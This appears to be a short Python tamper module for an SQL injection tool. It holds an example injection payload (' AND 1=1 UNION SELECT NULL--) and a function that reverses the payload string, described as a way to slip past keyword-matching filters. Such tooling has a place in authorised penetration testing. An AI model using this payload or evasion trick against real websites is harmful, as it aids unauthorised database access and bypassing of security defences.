__example_payload__ = "' AND 1=1 UNION SELECT NULL--"
__type__ = "reverse the payload string to evade keyword matching"


def tamper(payload, **kwargs):
    if payload:
        return payload[::-1]
    return payload
